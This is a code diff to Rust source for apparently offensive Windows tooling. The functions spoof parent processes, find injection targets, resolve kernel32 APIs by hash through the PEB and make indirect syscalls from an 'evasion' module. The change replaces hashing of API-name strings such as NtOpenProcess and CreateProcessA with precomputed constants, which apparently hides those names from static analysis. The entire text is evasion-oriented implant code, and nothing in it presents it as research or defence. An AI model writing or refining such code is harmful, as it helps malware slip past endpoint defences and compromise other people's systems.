@@ -17,13 +17,14 @@ use windows_sys::Win32::System::Threading::{
 /// Resolve CreateProcessA and PROC_THREAD_ATTRIBUTE helpers from kernel32 by hash (x64 only).
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn k32_proc_fns() -> Option<(usize, usize, usize, usize)> {
-    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::h;
     let k32 = peb_get_module_base(djb2_hash_lower(b"kernel32.dll"));
     if k32.is_null() { return None; }
-    let init = resolve_by_hash(k32, djb2_hash(b"InitializeProcThreadAttributeList"))? as usize;
-    let upd  = resolve_by_hash(k32, djb2_hash(b"UpdateProcThreadAttribute"))? as usize;
-    let del  = resolve_by_hash(k32, djb2_hash(b"DeleteProcThreadAttributeList"))? as usize;
-    let cpa  = resolve_by_hash(k32, djb2_hash(b"CreateProcessA"))? as usize;
+    let init = resolve_by_hash(k32, h::K32_INIT_PTA)? as usize;
+    let upd  = resolve_by_hash(k32, h::K32_UPD_PTA)? as usize;
+    let del  = resolve_by_hash(k32, h::K32_DEL_PTA)? as usize;
+    let cpa  = resolve_by_hash(k32, h::K32_CREATE_PA)? as usize;
     Some((init, upd, del, cpa))
 }
 
@@ -53,7 +54,10 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
     let mut cid: ClientId = unsafe { core::mem::zeroed() };
     cid.unique_process = parent_pid as usize;
     let mut h_parent: isize = 0;
-    let (ssn_open, tramp_open) = crate::evasion::syscalls::get_ssn(b"NtOpenProcess")?;
+    let (ssn_open, tramp_open) = {
+        use crate::resolve::api_hash::h;
+        crate::evasion::syscalls::get_ssn_h(h::NT_OPEN_PROC)?
+    };
     let status = crate::evasion::syscalls::indirect_syscall(
         ssn_open, tramp_open,
         &mut h_parent as *mut isize as usize,
@@ -111,7 +115,10 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
     );
 
     del_attr(attr_buf.as_mut_ptr() as *mut core::ffi::c_void);
-    if let Some((ssn_c, tramp_c)) = crate::evasion::syscalls::get_ssn(b"NtClose") {
+    if let Some((ssn_c, tramp_c)) = {
+        use crate::resolve::api_hash::h;
+        crate::evasion::syscalls::get_ssn_h(h::NT_CLOSE)
+    } {
         crate::evasion::syscalls::indirect_syscall(ssn_c, tramp_c, h_parent as usize, 0, 0, 0, 0, 0);
     }
 
@@ -137,9 +144,10 @@ pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> 
     // Fallback plain CreateProcessA — still hash-resolved on x64
     #[cfg(target_arch = "x86_64")]
     let cpa_plain: unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32 = {
-        use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+        use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+        use crate::resolve::api_hash::h;
         let k32 = peb_get_module_base(djb2_hash_lower(b"kernel32.dll"));
-        match resolve_by_hash(k32, djb2_hash(b"CreateProcessA")) {
+        match resolve_by_hash(k32, h::K32_CREATE_PA) {
             Some(p) => core::mem::transmute(p),
             None    => return None,
         }
@@ -183,8 +191,9 @@ pub unsafe fn find_injection_target() -> Option<u32> {
 /// x64 offsets: ImageName.Length@0x38, ImageName.Buffer@0x40, UniqueProcessId@0x50.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
-    let Some((ssn, tramp)) = get_ssn(b"NtQuerySystemInformation") else { return None; };
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
+    use crate::resolve::api_hash::h;
+    let Some((ssn, tramp)) = get_ssn_h(h::NT_QS_INFO) else { return None; };
     let mut needed = 0u32;
     let mut dummy = [0u8; 8];
     indirect_syscall(ssn, tramp, 5, dummy.as_mut_ptr() as usize, 8, &mut needed as *mut u32 as usize, 0, 0);
@@ -225,9 +234,10 @@ unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
         CreateToolhelp32Snapshot, Process32First, Process32Next,
         TH32CS_SNAPPROCESS, PROCESSENTRY32,
     };
-    let nt_close_s = |h: isize| {
-        if let Some((sc, tc)) = crate::evasion::syscalls::get_ssn(b"NtClose") {
-            crate::evasion::syscalls::indirect_syscall(sc, tc, h as usize, 0, 0, 0, 0, 0);
+    let nt_close_s = |h_val: isize| {
+        use crate::resolve::api_hash::h;
+        if let Some((sc, tc)) = crate::evasion::syscalls::get_ssn_h(h::NT_CLOSE) {
+            crate::evasion::syscalls::indirect_syscall(sc, tc, h_val as usize, 0, 0, 0, 0, 0);
         }
     };
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
